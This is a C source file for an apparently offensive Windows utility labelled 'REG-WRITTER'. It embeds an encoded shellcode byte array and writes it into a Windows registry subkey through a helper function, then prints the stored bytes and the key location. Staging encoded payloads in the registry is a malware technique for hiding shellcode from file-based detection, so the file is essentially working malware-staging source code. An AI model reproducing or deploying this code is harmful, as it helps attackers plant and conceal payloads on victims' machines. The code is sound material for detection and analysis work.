#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<winreg.h>
#include"func.h"

BOOL verifier = FALSE;

unsigned char shellenc[] =
"\xd2\xc6\xac\x2e\x2e\x2e\x4e\xa7\xcb\x1f\xee\x4a\xa5\x7e\x1e\xa5"
"\x7c\x22\xa5\x7c\x3a\xa5\x5c\x06\x21\x99\x64\x08\x1f\xd1\x82\x12"
"\x4f\x52\x2c\x02\x0e\xef\xe1\x23\x2f\xe9\xcc\xdc\x7c\x79\xa5\x7c"
"\x3e\xa5\x64\x12\xa5\x62\x3f\x56\xcd\x66\x2f\xff\x7f\xa5\x77\x0e"
"\x2f\xfd\xa5\x67\x36\xcd\x14\x67\xa5\x1a\xa5\x2f\xf8\x1f\xd1\x82"
"\xef\xe1\x23\x2f\xe9\x16\xce\x5b\xd8\x2d\x53\xd6\x15\x53\x0a\x5b"
"\xca\x76\xa5\x76\x0a\x2f\xfd\x48\xa5\x22\x65\xa5\x76\x32\x2f\xfd"
"\xa5\x2a\xa5\x2f\xfe\xa7\x6a\x0a\x0a\x75\x75\x4f\x77\x74\x7f\xd1"
"\xce\x71\x71\x74\xa5\x3c\xc5\xa3\x73\x44\x2f\xa3\xab\x9c\x2e\x2e"
"\x2e\x7e\x46\x1f\xa5\x41\xa9\xd1\xfb\x95\xde\x9b\x8c\x78\x46\x88"
"\xbb\x93\xb3\xd1\xfb\x12\x28\x52\x24\xae\xd5\xce\x5b\x2b\x95\x69"
"\x3d\x5c\x41\x44\x2e\x7d\xd1\xfb\x6d\x14\x72\x72\x7e\x5c\x41\x49"
"\x5c\x4f\x43\x0e\x68\x47\x42\x4b\x5d\x72\x72\x69\x41\x41\x49\x42"
"\x4b\x72\x72\x6d\x46\x5c\x41\x43\x4b\x72\x72\x6f\x5e\x5e\x42\x47"
"\x4d\x4f\x5a\x47\x41\x40\x72\x72\x4d\x46\x5c\x41\x43\x4b\x00\x4b"
"\x56\x4b\x2e";

int main() {

	printf("   _____       _      _            \n");
	printf("  / ____|     | |    (_)           \n");
	printf(" | (___   __ _| |     _ _ __ ___   \n");
	printf("  \\___ \\ / _` | |    | | '_ ` _ \\  \n");
	printf("  ____) | (_| | |____| | | | | | | \n");
	printf(" |_____/ \\__,_|______|_|_| |_| |_| \n");
	printf("                                   \n");
	printf("                                   \n");

	printf("   _   _   _   _   _   _   _   _   _   _   _   \n");
	printf("  / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\  \n");
	printf(" ( R | E | G | - | W | R | I | T | T | E | R )\n");
	printf("  \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/  \n");
	printf("\n");
	printf("\n");



	verifier = WrtiteToReg(shellenc, sizeof(shellenc));

	if (verifier == FALSE) {

		printf("Error 7anoni \n ");
		return EXIT_FAILURE;
	}

	printf("[+] // DONE \n");
	printf("\n");
	printf("[+] // We Wrote this : \n");
	printf("\n");

	int length = sizeof(shellenc) - 1;  // Subtract 1 to ignore the null terminator

	// Loop through the array and print each byte in hexadecimal format
	for (int i = 0; i < length; i++) {
		printf("\\x%02x", shellenc[i]);
		if (i % 12 == 0 & i != 0) {
			printf("\n");
		}
	}

	printf("\n");
	printf("\n");

	printf("into % s Registry in %s SUBKEY \n", SUBREG, REG);

}